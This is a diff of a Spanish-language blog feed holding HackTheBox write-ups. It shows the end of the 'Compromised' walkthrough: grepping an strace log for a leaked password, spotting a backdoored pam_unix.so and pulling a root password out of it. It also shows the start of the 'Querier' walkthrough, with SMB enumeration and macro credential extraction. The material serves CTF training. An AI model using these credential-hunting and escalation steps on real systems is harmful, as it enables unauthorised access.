+&lt;p&gt;Una vez dentro como el usuario &lt;code&gt;mysql&lt;/code&gt;, vamos a buscar de manera recursiva por la palabra &lt;code&gt;sysadmin&lt;/code&gt;, encontramos un archivo &lt;code&gt;lib/mysql/strace-log.dat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ grep -ri &quot;sysadmin&quot; 2&amp;gt;/dev/null
+log/cloud-init.log:2020-05-08 15:50:07,874 - __init__.py[DEBUG]: Adding user sysadmin
+log/cloud-init.log:2020-05-08 15:50:07,874 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
+log/cloud-init.log:2020-05-08 15:50:31,366 - cc_ssh_import_id.py[DEBUG]: User sysadmin is not configured for ssh_import_id
+log/cloud-init-output.log:ci-info: no authorized SSH keys fingerprints found for user sysadmin.
+log/installer/subiquity-debug.log.2150:2020-05-08 15:33:28,872 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '&amp;lt;REDACTED&amp;gt;'}
+lib/dpkg/info/systemd.postinst:# runtime-dir/sysadmin-dir/other packages (e.g. rsyslog)
+lib/dpkg/info/dash.postinst:		# The sysadmin wants it this way.  Who am I to argue?
+lib/dpkg/info/libssl1.0.0:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
+lib/dpkg/info/libssl1.1:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
+lib/dpkg/info/irqbalance.postinst:    # things the local sysadmin has added to the old /etc/default/irqbalance
+lib/dpkg/info/irqbalance.postinst:        # Insert a header to help sysadmin figure out why these things are here.
+lib/dpkg/info/irqbalance.postinst:        # been added to the file by the local sysadmin.
+lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited root
+lib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking the
+lib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadmins
+lib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited root
+lib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking the
+lib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadmins
+lib/mysql/strace-log.dat:22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+lib/mysql/strace-log.dat:22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+lib/mysql/strace-log.dat:22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22102 03:11:09 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22102 03:11:15 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
+lib/mysql/strace-log.dat:22229 03:11:18 readlink(&quot;/home/sysadmin/.mysql_history&quot;, 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Leemos el archivo y filtramos por &lt;code&gt;sysadmin y password&lt;/code&gt;, para tratar de encontrar credenciales en texto claro.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ cat lib/mysql/strace-log.dat | grep -iE &quot;sysadmin|password&quot;
+22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
+22102 03:11:06 write(2, &quot;mysql -u root --password='3*NLJE&quot;..., 39) = 39
+22227 03:11:09 execve(&quot;/usr/bin/mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password=3*NLJE32I$Fe&quot;], 0x55bc62467900 /* 21 vars */) = 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Encontramos una credencial que si la validamos corresponde al usuario &lt;code&gt;sysadmin&lt;/code&gt;, ahora podemos ir a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ su sysadmin
+Password: 
+sysadmin@compromised:/var$ whoami
+sysadmin
+sysadmin@compromised:/var$ cd /home/sysadmin/
+sysadmin@compromised:~$ cat user.txt 
+e0915cc0811946d4d341100789b6592e
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Como la maquina se llama &lt;code&gt;compromised&lt;/code&gt;, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Para poder detectarlo vamos a usar &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&quot;&gt;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ejecutamos el &lt;code&gt;linpeas&lt;/code&gt; y encontramos que &lt;code&gt;.pam_unix.so&lt;/code&gt; se encuentra oculto.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;pam_unix.so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Como vemos el &lt;code&gt;pam_unix&lt;/code&gt; toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 .pam_unix.so; echo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Una vez tengamos el archivo en nuestro equipo vamos a examinarlo con &lt;code&gt;radare2&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file pam_unix.so
+pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped
+❯ radare2 pam_unix.so
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+ -- Select your architecture with: 'e asm.arch=&amp;lt;arch&amp;gt;' or r2 -a from the shell
+[0x000025c0]&amp;gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze all functions arguments/locals
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Integrate dwarf function information.
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x000025c0]&amp;gt; afl
+0x000025c0    4 50   -&amp;gt; 40   entry0
+0x00002c70   28 732  -&amp;gt; 681  dbg.pam_sm_acct_mgmt
+0x00002f70   34 670  -&amp;gt; 633  dbg.pam_sm_authenticate
+0x00004390   13 222  -&amp;gt; 210  dbg.pam_sm_close_session
+0x00003210    6 116          dbg.pam_sm_setcred
+0x00003750  104 2863 -&amp;gt; 2805 dbg.pam_sm_chauthtok
+0x00004280   13 262  -&amp;gt; 256  dbg.pam_sm_open_session
+[0x000025c0]&amp;gt; s dbg.pam_sm_authenticate
+[0x00002f70]&amp;gt; pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Analizando vemos una intrucción que hace referencia a &lt;code&gt;pam_unix_auth.c&lt;/code&gt;, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos &lt;code&gt;zlke~U3Env82m2-&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos y efectivamente la credencial corresponde al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su root
+Password: 
+root@compromised:/lib/x86_64-linux-gnu/security# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@compromised:/lib/x86_64-linux-gnu/security# cd /root/
+root@compromised:~# cat root.txt 
+e62293eadbdb5c168b024782d6943394
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Compromissed</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Compromissed</guid>
+        
+        <category>Information leaked</category>
+        
+        <category>bypass disable functions php</category>
+        
+        <category>litecart exploit</category>
+        
+        <category>tty interactive</category>
+        
+        <category>enumeration sql</category>
+        
+        <category>UDF</category>
+        
+        <category>log filter</category>
+        
+        <category>rootkit</category>
+        
+        <category>linpeas</category>
+        
+        <category>pamunix</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Time - htb writeup</title>
@@ -8762,822 +9327,6 @@ Voy a estudiar python
         
         
         <category>novedades</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Querier - htb writeup</title>
-        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Querier&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Comenzaremos enumerando los recursos compartidos &lt;code&gt;smb&lt;/code&gt; para obtener la contraseña de un usuario, informando que puede iniciar sesión en el &lt;code&gt;mssql-server&lt;/code&gt;. Para obtener el usuario en el sistema, podemos robar el hash del usuario &lt;code&gt;mssql-svc&lt;/code&gt; ejecutando el comando &lt;code&gt;xp_dirtree&lt;/code&gt; y finalmente para la escalada de privilegios al administrador que es bastante sencilla aprovecharemos el script &lt;code&gt;powerup.ps1&lt;/code&gt; de powersploit para obtener las credenciales administrativas alojadas en un archivo &lt;code&gt;xml&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Querier
-❯ ls
- Querier
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.125
-PING 10.10.10.125 (10.10.10.125) 56(84) bytes of data.
-64 bytes from 10.10.10.125: icmp_seq=1 ttl=127 time=137 ms
-
---- 10.10.10.125 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 137.483/137.483/137.483/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.125 -oG allPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-25 14:23 GMT
-Initiating SYN Stealth Scan at 14:23
-Scanning 10.10.10.125 [65535 ports]
-Discovered open port 135/tcp on 10.10.10.125
-Discovered open port 139/tcp on 10.10.10.125
-Discovered open port 445/tcp on 10.10.10.125
-Discovered open port 49664/tcp on 10.10.10.125
-Discovered open port 49665/tcp on 10.10.10.125
-Discovered open port 49670/tcp on 10.10.10.125
-Discovered open port 47001/tcp on 10.10.10.125
-Discovered open port 49668/tcp on 10.10.10.125
-Discovered open port 49666/tcp on 10.10.10.125
-Discovered open port 49667/tcp on 10.10.10.125
-Discovered open port 1433/tcp on 10.10.10.125
-Discovered open port 49669/tcp on 10.10.10.125
-Discovered open port 49671/tcp on 10.10.10.125
-Discovered open port 5985/tcp on 10.10.10.125
-Completed SYN Stealth Scan at 14:23, 19.31s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.125
-Host is up, received user-set (0.11s latency).
-Scanned at 2023-03-25 14:23:13 GMT for 19s
-Not shown: 65090 closed tcp ports (reset), 431 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE      REASON
-135/tcp   open  msrpc        syn-ack ttl 127
-139/tcp   open  netbios-ssn  syn-ack ttl 127
-445/tcp   open  microsoft-ds syn-ack ttl 127
-1433/tcp  open  ms-sql-s     syn-ack ttl 127
-5985/tcp  open  wsman        syn-ack ttl 127
-47001/tcp open  winrm        syn-ack ttl 127
-49664/tcp open  unknown      syn-ack ttl 127
-49665/tcp open  unknown      syn-ack ttl 127
-49666/tcp open  unknown      syn-ack ttl 127
-49667/tcp open  unknown      syn-ack ttl 127
-49668/tcp open  unknown      syn-ack ttl 127
-49669/tcp open  unknown      syn-ack ttl 127
-49670/tcp open  unknown      syn-ack ttl 127
-49671/tcp open  unknown      syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds
-           Raw packets sent: 95410 (4.198MB) | Rcvd: 82570 (3.303MB)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;139 ldap&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; , &lt;code&gt;1433 mssql&lt;/code&gt; y &lt;code&gt;5985 winrm&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-25 14:26 GMT
-Nmap scan report for 10.10.10.125
-Host is up (0.44s latency).
-
-PORT      STATE SERVICE       VERSION
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
-| ms-sql-ntlm-info: 
-|   Target_Name: HTB
-|   NetBIOS_Domain_Name: HTB
-|   NetBIOS_Computer_Name: QUERIER
-|   DNS_Domain_Name: HTB.LOCAL
-|   DNS_Computer_Name: QUERIER.HTB.LOCAL
-|   DNS_Tree_Name: HTB.LOCAL
-|_  Product_Version: 10.0.17763
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Not valid before: 2023-03-25T14:21:57
-|_Not valid after:  2053-03-25T14:21:57
-|_ssl-date: 2023-03-25T14:27:31+00:00; -1s from scanner time.
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49668/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  msrpc         Microsoft Windows RPC
-49670/tcp open  msrpc         Microsoft Windows RPC
-49671/tcp open  msrpc         Microsoft Windows RPC
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: -1s, deviation: 0s, median: -1s
-| ms-sql-info: 
-|   10.10.10.125:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-| smb2-time: 
-|   date: 2023-03-25T14:27:20
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 76.96 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;135&lt;/td&gt;
-      &lt;td&gt;RPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;139&lt;/td&gt;
-      &lt;td&gt;LDAP&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;445&lt;/td&gt;
-      &lt;td&gt;SMB&lt;/td&gt;
-      &lt;td&gt;?&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;1433&lt;/td&gt;
-      &lt;td&gt;MSSQL-S&lt;/td&gt;
-      &lt;td&gt;Microsoft SQL Server 2017 14.00.1000.00; RTM&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;5985&lt;/td&gt;
-      &lt;td&gt;WINRM&lt;/td&gt;
-      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usaremos la herramienta crackmapexec:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125
-SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a buscar si hay recursos compartidos a los que podemos acceder, para ello podemos hacer uso de smbmap con los parametros &lt;code&gt;-H&lt;/code&gt; para especificar el host y &lt;code&gt;-u&lt;/code&gt; para hacer uso de una sesion nula.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.125 -u 'null'
-[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
-	Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	ADMIN$                                            	NO ACCESS	Remote Admin
-	C$                                                	NO ACCESS	Default share
-	IPC$                                              	READ ONLY	Remote IPC
-	Reports                                           	READ ONLY	
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Despues de ver que si podemos listar los recursos compartidos, vemos uno interesante con el nombre de &lt;code&gt;Reports&lt;/code&gt; vamos a ingresar en el para ver su contenido, añadiremos para eso el parametro ‘-r’ y el nombre del recurso:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.125 -u 'null' -r Reports
-[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
-	Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	Reports                                           	READ ONLY	
-	.\Reports\*
-	dr--r--r--                0 Mon Jan 28 23:26:31 2019	.
-	dr--r--r--                0 Mon Jan 28 23:26:31 2019	..
-	fr--r--r--            12229 Mon Jan 28 23:26:31 2019	Currency Volume Report.xlsm
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Dentro existe un archivo con la extension &lt;code&gt;xlsm&lt;/code&gt;, asi que vamos a descargarnoslo y renombrar el archivo a un nombre mas comodo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.125 -u 'null' --download &quot;Reports\Currency Volume Report.xlsm&quot;
-[+] Starting download: Reports\Currency Volume Report.xlsm (12229 bytes)
-[+] File output to: /home/fmiracle/Machines/Querier/content/10.10.10.125-Reports_Currency Volume Report.xlsm
-❯ ls
- 10.10.10.125-Reports_Currency Volume Report.xlsm
-❯ mv 10.10.10.125-Reports_Currency\ Volume\ Report.xlsm Report.xlsm
-❯ ls
- Report.xlsm
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Como es un archivo &lt;code&gt;xlsm&lt;/code&gt; trataremos con el comando &lt;code&gt;strings&lt;/code&gt; lista del archivo algunos caracteres legibles:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ strings Report.xlsm
-[Content_Types].xml 
-apP&amp;lt;*
-Fi+i
-d|}5
-o=`Fh
-O(%$
-_rels/.rels 
-BKwAH
-GJy(v
-USh9i
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al no ver informacion interesante, vamos a utilizar un herramienta de github llamada &lt;code&gt;olebva&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/decalage2/oletools/wiki/olevba&quot;&gt;https://github.com/decalage2/oletools/wiki/olevba&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Esta herramienta nos permite analizar archivos &lt;code&gt;OLE&lt;/code&gt; y &lt;code&gt;OpenXML&lt;/code&gt;, como documentos de &lt;code&gt;MS Office&lt;/code&gt; para poder detectar macros en texto claro.&lt;/p&gt;
-
-&lt;p&gt;Ejecutamos la herramienta pasandole el archivo &lt;code&gt;xlsm&lt;/code&gt; y esta nos parsea la informacion donde podemos ver un &lt;code&gt;usario&lt;/code&gt; y &lt;code&gt;contraseña&lt;/code&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ olevba Report.xlsm
-olevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools
-===============================================================================
-FILE: Report.xlsm
-Type: OpenXML
-WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------------------------------------------------------------------
-VBA MACRO ThisWorkbook.cls 
-in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-
-' macro to pull data for client volume reports
-'
-' further testing required
-
-Private Sub Connect()
-
-Dim conn As ADODB.Connection
-Dim rs As ADODB.Recordset
-
-Set conn = New ADODB.Connection
-conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
-conn.ConnectionTimeout = 10
-conn.Open
-
-If conn.State = adStateOpen Then
-
-  ' MsgBox &quot;connection successful&quot;
- 
-  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
-  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
-  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
-  rs.Close
-
-End If
-
-End Sub
--------------------------------------------------------------------------------
-VBA MACRO Sheet1.cls 
-in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-(empty macro)
-+----------+--------------------+---------------------------------------------+
-|Type      |Keyword             |Description                                  |
-+----------+--------------------+---------------------------------------------+
-|Suspicious|Open                |May open a file                              |
